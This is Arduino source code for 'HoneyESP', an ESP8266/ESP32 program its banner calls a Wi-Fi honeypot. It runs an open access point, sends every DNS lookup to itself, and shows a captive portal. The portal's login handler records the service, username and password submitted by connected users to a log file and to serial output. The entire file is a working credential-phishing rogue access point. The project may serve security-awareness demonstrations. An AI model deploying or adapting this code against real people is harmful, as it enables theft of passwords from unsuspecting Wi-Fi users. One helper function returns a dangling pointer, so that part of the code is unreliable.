#ifdef ESP8266
#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <ESP8266mDNS.h>
#include <FS.h>
#else
#include <WiFi.h>
#include <WiFiClient.h>
#include <WebServer.h>
#include <ESPmDNS.h>
#include <SPIFFS.h>
#endif

#include <DNSServer.h>

#define DNS_PORT 53
#define HTTP_PORT 80
#define BLOCK_SSID_REQUEST
#define DEFAULT_SSID_PREFIX "HoneyESP-"
#define AP_ADDRESS "10.0.0.1"
#define AP_NETMASK "255.255.255.0"
#define AP_CHANNEL 1
#define AP_MAX_CLIENTS 8
#define HOSTNAME "wifi-gateway.local"
#define FILENAME_SSID "/ssid.txt"
#define FILENAME_DATALOG "/datalog.txt"

#define FILE_READ "r"
#define FILE_WRITE "a"

DNSServer dnsServer;
#ifdef ESP8266
ESP8266WebServer server(HTTP_PORT);
#else
WebServer server(HTTP_PORT);
#endif
int lastClientCount = -1;

void setup() {
  // Finish initialization of ESP
  delay(1000);

  // Print banner
  Serial.begin(9600);
  Serial.println();
  Serial.println(" _   _                        _____ ____  ____");
  Serial.println("| | | | ___  _ __   ___ _   _| ____/ ___||  _ \\  ESP8266/ESP32 honeypot version 2.0");
  Serial.println("| |_| |/ _ \\| '_ \\ / _ \\ | | |  _| \\___ \\| |_) | SPIFFS Version");
  Serial.println("|  _  | (_) | | | |  __/ |_| | |___ ___) |  __/  github.com/ridercz/HoneyESP");
  Serial.println("|_| |_|\\___/|_| |_|\\___|\\__, |_____|____/|_|     (c) 2018-2019 Michal Altair Valasek");
  Serial.println("                        |___/                    www.altairis.cz | www.rider.cz");
  Serial.println();

  // Initialize SPIFFS
  Serial.print("Initializing SPIFFS...");
  if (SPIFFS.begin()) {
    Serial.println("OK");
  } else {
    Serial.println("Failed!");
    Serial.println("System halted.");
    while (true);
  }

  // Create SSID
#ifdef ESP8266
  WiFi.mode(WIFI_AP);
#else
  WiFi.mode(WIFI_MODE_AP);
#endif
  String ssid = DEFAULT_SSID_PREFIX + WiFi.softAPmacAddress();
  if (SPIFFS.exists(FILENAME_SSID)) {
    File ssidFile = SPIFFS.open(FILENAME_SSID, FILE_READ);
    ssid = ssidFile.readString();
    ssidFile.close();
    Serial.print("  SSID:             "); Serial.println(ssid);
  } else {
    Serial.print("  SSID (generated): "); Serial.println(ssid);
  }
  Serial.print("  MAC:              "); Serial.println(WiFi.softAPmacAddress());
  Serial.print("  Host name:        "); Serial.println(HOSTNAME);

  // Show HW platform
#ifdef ESP8266
  Serial.println("  HW platform:      ESP8266");
#else
  Serial.println("  HW platform:      ESP32");
#endif

  // Parse IP address and netmask
  IPAddress ip, nm;
  ip.fromString(AP_ADDRESS);
  nm.fromString(AP_NETMASK);

  // Configure AP
  Serial.print("Configuring access point...");
  WiFi.softAPConfig(ip, ip, nm);
  WiFi.softAP(ssid.c_str(), "", AP_CHANNEL, false, AP_MAX_CLIENTS);
  Serial.println("OK");

  // Write delimiter to data file
  Serial.print("Writing data log...");
  File logFile = SPIFFS.open(FILENAME_DATALOG, FILE_WRITE);
  if (logFile) {
    logFile.print("; SSID = ");
    logFile.println(ssid);
    logFile.close();
    Serial.println("OK");
  } else {
    Serial.println("Failed!");
    Serial.println("System halted.");
    while (true);
  }

  // Set redirection of all DNS queries to itself
  Serial.print("Configuring DNS...");
  dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
  dnsServer.start(DNS_PORT, "*", ip);
  Serial.println("OK");

  // Enable HTTP server
  Serial.print("Starting HTTP server...");
  server.on("/login.htm", handleLogin);
#ifdef BLOCK_SSID_REQUEST
  server.on(getUrlFromFileName(FILENAME_SSID), send404);
#endif
  server.onNotFound(handleRequest);
  server.begin();
  Serial.println("OK");
  Serial.println();
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();

  int currentClientCount = WiFi.softAPgetStationNum();
  if (lastClientCount != currentClientCount) {
    lastClientCount = currentClientCount;
    Serial.print("Connected clients: ");
    Serial.println(currentClientCount);
  }
}

void handleLogin() {
  // Save form data to text file
  File logFile = SPIFFS.open(FILENAME_DATALOG, FILE_WRITE);
  if (logFile) {
    String logLine = server.arg("svc");
    logLine += "\t" + server.arg("usr");
    logLine += "\t" + server.arg("pwd");
    Serial.println(logLine);
    logFile.println(logLine);
    logFile.close();
  } else {
    Serial.println("Error opening data file.");
  }

  // Redirect to error page
  String message = "<html><head><title>302 Found</title></head><body><a href=\"/error.htm\">Continue here</a></body></html>";
  server.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
  server.sendHeader("Pragma", "no-cache");
  server.sendHeader("Expires", "-1");
  server.sendHeader("Location", "/error.htm");
  server.send(302, "text/html", message);
}

void handleRequest() {
  if (server.hostHeader() != HOSTNAME) redirectToCaptivePortal();
  if (sendFileFromSPIFFS(server.uri())) return;
  send404();
}

void send404() {
  String message = "<html><head><title>404 Object Not Found</title></head><body><h1>404 Object Not Found</h1></body></html>";
  server.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
  server.sendHeader("Pragma", "no-cache");
  server.sendHeader("Expires", "-1");
  server.send(404, "text/html", message);
}

void redirectToCaptivePortal() {
  String location = "http://";
  location += HOSTNAME;
  location += "/";

  String message = "<html><head><title>302 Found</title></head><body><a href=\"" + location + "\">Continue here</a></body></html>";
  server.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
  server.sendHeader("Pragma", "no-cache");
  server.sendHeader("Expires", "-1");
  server.sendHeader("Location", location);
  server.send(302, "text/html", message);
}

bool sendFileFromSPIFFS(String path) {
  // Append index.htm to directory requests
  if (path.endsWith("/")) path += "index.htm";

  // Determine MIME type
  String dataType = "application/octet-stream";
  if (path.endsWith(".htm")) {
    dataType = "text/html";
  } else if (path.endsWith(".css")) {
    dataType = "text/css";
  } else if (path.endsWith(".js")) {
    dataType = "application/javascript";
  } else if (path.endsWith(".png")) {
    dataType = "image/png";
  } else if (path.endsWith(".gif")) {
    dataType = "image/gif";
  } else if (path.endsWith(".jpg")) {
    dataType = "image/jpeg";
  } else if (path.endsWith(".ico")) {
    dataType = "image/x-icon";
  } else if (path.endsWith(".txt")) {
    dataType = "text/plain";
  }

  // Find appropriate file in SPIFFS
  File dataFile;
  if (SPIFFS.exists(path.c_str())) {
    // File exists
    dataFile = SPIFFS.open(path.c_str(), FILE_READ);
  } else {
    // File does not exists, but maybe it's directory with index.html
    path += "/index.htm";
    if (SPIFFS.exists(path.c_str())) {
      // Yes, it is - use index.html
      dataType = "text/html";
      dataFile = SPIFFS.open(path.c_str(), FILE_READ);
    } else {
      // No, it is not
      return false;
    }
  }

  // Stream the resulting file
  server.streamFile(dataFile, dataType);
  dataFile.close();
  return true;
}

const char* getUrlFromFileName(const char* fileName) {
  String url = "/";
  url += fileName;
  return url.c_str();
}
